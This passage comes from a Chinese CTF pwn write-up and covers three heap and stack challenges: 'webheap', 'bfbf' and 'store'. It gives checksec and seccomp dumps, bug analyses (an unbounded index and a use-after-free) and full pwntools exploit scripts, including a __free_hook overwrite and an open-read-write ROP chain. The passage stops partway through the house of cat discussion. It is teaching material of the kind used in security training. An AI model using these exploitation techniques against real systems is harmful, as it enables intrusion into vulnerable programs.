class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./webheap&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chuj.top&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x4918)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setuint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;=<span class="number">0</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7f</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x80</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x81</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x8000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x82</span>)+p32(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80000000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffffffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x83</span>)+p64(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">and</span> x &lt;= <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x84</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x100</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x85</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x10000</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x86</span>)+p32(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_code</span>(<span class="params">op, idx, size, num1,num2</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += setint(op) + setuint(idx) +setuint(size) + <span class="string">&#x27;\xBD&#x27;</span>+setuint(num1)+p8(<span class="number">0</span>)+setuint(num2)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Packet length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">0</span>,idx,size,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">1</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">2</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += p8(<span class="number">3</span>) +p8(idx) + p8(<span class="number">0x30</span>) + <span class="string">&#x27;\xBD&#x27;</span>+p8(<span class="number">6</span>)+p64(cont)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Packet length: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x440</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget = libcbase + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcbase &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,free_hook)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x6873</span>)</span><br><span class="line">edit(<span class="number">3</span>,system)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.8</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=e3bffe1cec71dcd6694ca6bd031a59f4855b9b86, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x25</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>限制了 <code>read</code>（其实也 ban 了 <code>execve</code>，但这里没有显示）</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>题目就是想模仿 Brainfuck 语言</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">char</span> buf[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">......</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          write(<span class="number">1</span>, &amp;buf[i], <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">          buf[i] = getchar();</span><br></pre></td></tr></table></figure>
<ul>
<li>没有对“i”进行限制</li>
<li>利用 “.” 和 “&gt;” 的配合可以实现 leak</li>
<li>利用 “,” 和 “&gt;” 的配合可以覆盖 ret</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>泄露完整之后，直接覆盖返回地址为 ORW 的变种</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.205&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x18CD)\n&quot;</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&gt;&#x27;</span>*(<span class="number">512</span>+<span class="number">5</span>*<span class="number">8</span>) + <span class="string">b&#x27;.&gt;&#x27;</span> * <span class="number">7</span> + <span class="string">b&#x27;.&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&gt;&#x27;</span>*(<span class="number">1</span>*<span class="number">8</span>) + <span class="string">b&#x27;.&gt;&#x27;</span> * <span class="number">7</span> + <span class="string">b&#x27;.&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;&#x27;</span>*(<span class="number">4</span>*<span class="number">8</span>-<span class="number">1</span>+<span class="number">7</span>)+<span class="string">b&#x27;,&gt;&#x27;</span>*<span class="number">0xb8</span> + <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">heapbase = u64(p.recvuntil(<span class="string">b&#x27;\x56&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2a0</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">log.success(<span class="string">&quot;heapbase: &quot;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">open_addr = libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = <span class="number">0x684</span>+heapbase</span><br><span class="line">pop_rax_ret=libc.address+<span class="number">0x0000000000036174</span></span><br><span class="line">pop_rdi_ret=libc.address+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret=libc.address+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret=libc.address+<span class="number">0x0000000000142c92</span></span><br><span class="line">syscall_ret=libc.address+<span class="number">0x630a9</span></span><br><span class="line"></span><br><span class="line">payload =  p64(pop_rax_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(heapbase)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) </span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;_exit&#x27;</span>]) </span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">store: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9_amd64/ld<span class="number">-2.31</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=cd388e748e0640343faaa81f9d2a6fccd07ff729, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  store seccomp-tools dump ./store                </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0e</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x13</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x0b</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x0000008c</span>  <span class="keyword">if</span> (A == getpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x0000008d</span>  <span class="keyword">if</span> (A == setpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x000000c0</span>  <span class="keyword">if</span> (A == lgetxattr) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0x000000e6</span>  <span class="keyword">if</span> (A == clock_nanosleep) <span class="keyword">goto</span> <span class="number">0023</span> <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0x40000003</span>  <span class="keyword">if</span> (A != ARCH_I386) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000005a</span>  <span class="keyword">if</span> (A == chmod) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000008c</span>  <span class="keyword">if</span> (A == getpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000008d</span>  <span class="keyword">if</span> (A == setpriority) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x000000c0</span>  <span class="keyword">if</span> (A != lgetxattr) <span class="keyword">goto</span> <span class="number">0024</span></span><br><span class="line"> <span class="number">0023</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0024</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( free_num )                            </span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((&amp;chunk_list)[index]);               <span class="comment">// UAF</span></span><br><span class="line">  --free_num;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>UAF</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目的限制如下：</p>
<ul>
<li>只能控制申请的头两个 chunk</li>
<li>限制释放次数为4次</li>
</ul>
<p>虽然只能控制申请的头两个 chunk，但还是可以完成 largebin attack</p>
<p>于是我们先进行泄露，然后用 largebin attack 劫持 <code>_IO_list_all</code>，接下来有两种思路：</p>
<ul>
<li>house of cat</li>
<li>house of apple</li>
</ul>
<p><strong>House Of Cat</strong></p>
<p>house of cat 的常规调用链为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysmalloc -&gt; __malloc_assert -&gt; __fxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt;  _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
<ul>
<li>使 top chunk 不足以申请从而调用 <code>sysmalloc</code></li>
</ul>
<p>直接调用 <code>exit</code> 则会触发另一条调用链：</p>
